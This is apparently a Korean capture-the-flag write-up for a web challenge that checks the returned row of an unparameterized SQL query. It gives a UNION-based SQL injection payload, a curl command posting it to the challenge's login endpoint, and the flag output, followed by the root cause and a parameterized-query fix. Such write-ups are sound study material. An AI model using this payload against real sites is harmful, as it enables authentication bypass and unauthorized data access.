````markdown
## userlevel_bypass

> 문제 설명: `userlevel` 값으로 DB를 조회한 뒤, 결과의 `userid`가 `'admin'`이고 `userlevel`이 `0`이면 flag가 출력되는 웹 문제입니다. 실제 admin 계정 여부가 아니라 **쿼리 결과값 자체**만 검증합니다.

### **SQL Injection 취약점 (UNION-based)**

```python
res = query_db(f"select * from users where userlevel='{userlevel}'")
...
userid = res[0]
userlevel = res[2]
if userid == 'admin' and userlevel == 0:
    return f'hello {userid} flag is {FLAG}'
```
````

`userlevel` 입력값이 검증 없이 쿼리에 삽입됩니다. 로직상 실제 admin row를 조회할 필요 없이, **`UNION SELECT`로 원하는 값을 가진 가짜 row를 직접 만들어 반환**시키면 조건을 통과합니다.

#### **동작 원리**

- `userlevel` 입력값에 `' UNION SELECT 'admin','x',0 --` 를 넣으면 쿼리가 다음과 같이 변합니다.
  ```sql
  select * from users where userlevel='' UNION SELECT 'admin','x',0 --'
  ```
- UNION으로 추가된 row의 값이 그대로 `res`가 되어 `res[0]='admin'`, `res[2]=0`이 성립합니다.
- `--`로 뒤의 작은따옴표를 주석 처리해 쿼리 에러를 방지합니다.

### Solve 😈

**userlevel:**

```
' UNION SELECT 'admin','x',0 --
```

```bash
curl -X POST http://host:port/login \
     -d "userlevel=' UNION SELECT 'admin','x',0 --"
```

**결과:**

```
hello admin flag is DH{chatGPT_told_me_a_lullaby}
```

### 주의할 점

- **컬럼 개수 일치**: `UNION SELECT`의 컬럼 수는 테이블 컬럼 수(`userid, userpassword, userlevel` → 3개)와 동일해야 함. 에러 발생 시 개수 조정 필요.
- **타입 일치**: `userlevel` 비교가 Python `==`이므로 정수 `0`과 문자열 `'0'`은 다름에 주의.

### 근본 원인 및 방어법

- **원인**: 사용자 입력을 문자열 포매팅으로 쿼리에 직접 삽입 → UNION 기반 임의 데이터 주입 가능
- **방어법**: Parameterized Query 사용
  ```python
  cur = db.execute("select * from users where userlevel=?", (userlevel,))
  ```

```

```
